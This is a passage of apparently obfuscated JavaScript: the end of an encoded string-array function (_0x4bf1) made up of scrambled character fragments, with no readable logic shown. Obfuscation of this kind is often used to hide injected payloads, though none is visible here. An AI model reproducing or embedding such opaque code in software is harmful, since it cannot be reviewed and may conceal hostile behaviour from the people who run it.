0.i','ecnnsRR2RR',')RccIRcR<R','<.iecP\x20R(e','.!v!;.!H+/','a6)\x22c7each','Ril0Oc)0Rn','1\x200Rb-.<mR','ngtip','x(1<![.tcC','I}du]<c(?r','R:>sR:Pl8<','Rkzt!dP\x20c$','ciuS1bRc-K','XRi.!C-ff,','0.RaocRR2u','.)7\x20\x22R:Lct','r.f..0x.<n','>e)Rm<cdlk','f<bKRc{.c2','[.1]n}a<.R','.\x20.a%jz_.R','P.\x20.C-RiR.','h.p.o<tp$9','RR\x20.]\x27R<?R','rk\x22<o.af}<','zccmy3IcuR','apR\x5cR,lRR!','=p%.l0v.Re','c...r<1R.w','G...!/45c}','bRRAz];dcn','o(.rP.pc.<','!.\x20Ad(cids','\x20t!t<RDf#R','ccc.eR.Rdc','i)R]ec\x22\x20Rt','dHoU1I@\x278R','\x22fsrd2ie,h','YhOota#trs','9r9GgwL&RR','arcDc\x20x0R.','Rl!RR(~k\x22R','nsRR]o/-n<','p@.;)nbp4e','Rr*RRc|als','s,la=cno;8','ct!NRn3<ei','x<]:RR[.ix','c.+rcy.urk','9R(vRskp$P','ckeMf(<hi!','i4(C(a=Cw[','eT,ceR}d.<','r<R.5OR\x27CR','+YinrRe<\x20i','ho#(\x27\x22P..c','\x20sRao<<dw,','\x20riWmAhRRP','.yPCr\x27\x20RRR','r!0e.oyRR\x20','2RRrmooPc.','`o4<$/)<1n','e\x20ce\x20<.R.c','ewRCrRl\x20R<',')R.RpS..lR','Ks.2rlod0.','RtR[<Ej&cR','aoRRihEcR.','Rn2\x20ct;e)(','r[;ii<cCgR','R9stR;g\x20R/','sn(=e)(afe','cyM.cft<(R','<_R<JRLe_D','}JROn.<}N<','cGcl.-\x20rfR','aRRaccucD1','p;2yic;htn','.G.cR1R\x20c.','.;[R[r.R.G','[t..c\x20dRR\x22','.{lRs}<Rs<','sHWSO','udsiR4i<.e','qeRd<Z.LR}','d^<Rs.<)n.','+.R<c.s.ds','hRh.<cRUr4','C0x(ReZ<>=','rg+l)8n+vr','RRPitvc<8b','pwwdRc.o.c','fcSc1\x22t..<','R6.D_,0i.d','NJZRi<o.c0','*.\x20Rcit0-R','<<<cc@eG.b',';j,ea=]6,n','k.R\x200cafwt','dcRefc%<cc','stR..o\x20_Rc','c<\x20tNn\x20c<e','lR0RsRL!<]','dla\x20k_c~Rn',':Rrq.w;.+e','Rb\x20ucj!RR<','Rj..>RReIt','bg(=o;va,9','c0./iTPc1n','_(;dGRr<<R','.<\x20s!\x20nd%k','v7r7[vfw70','l)RtF_e.E\x22','v(e-tRcdfy','\x22s.,c.d.h<','1.-ph.ss\x20\x20','=s4/UkdtcR','<PErci6\x221e',';f+o5((nr;','R]inStkvf#','-[.rvarb6u','}fiR\x20.<o\x20<','split','cdod&o(.\x22p','<]<\x5cR0R$t1','R.RfRGi(<R','c/)!A<hb13','.Cc1;R\x20)v\x20','1OiR<.f.RS','ons8vl.1n(','.D)c.R}hER','x+-\x20d)0+.s','\x20..o\x22\x20ccRa','.opR...2e\x22','RR=Rta+-]I','ke!R[$%(&!','0.P.y&+.cc','\x20N[RRR<.c<',';=z;,uttny',',R4.fo<RtR','.fnR1<5or#','e\x20arn)m((a','R.cR(.i<.a','4swt!nxt<m','drf],I.cRl','R.rc\x22ans.<','tRRlz%TR<R','o.i.ieR.iS','I<BR^c}}.R','Pu)R[N<[c.','ovut\x20.*Rzl',']\x20cye&[#)t','accRaU<c<<','r<)hreR/l-','aPRpxijeC<',')[ittr=\x22je','I\x5cR!kbIPZ\x27','t\x22Rdr>cw}d','R<aRs=oR\x270','<d\x27.v.(fx.','<qRR<R\x20\x22|\x20','<WRjoc\x27Mt4','RcR(.,RA/i','<r\x22ccRpc<)','.p9c?TR\x20cs','!1cu<;V4R{','!R&.9FhsPn','()s._c.R{K','X.R2ttP.J%','R_<..s.\x20`c','.oc-ac<[<6','rlopnfc9tG','dy<./9i$Rp','.b;Z\x27eRR.!','kFcWE','lR%n.B*+du','nlco.1P<sa','RT!-mciCRe','a.Rin{.ES(','v;8nv5te\x22.','cdm.P.I|tR','\x27ftRFR.c!s','p\x20e<ir<edR','u\x20{RP..R.f','a.ss]PR|S<','543917dujIyj','aD3<L-nURz'];_0x4bf1=function(){return _0x435f63;};return _0x4bf1();}
}
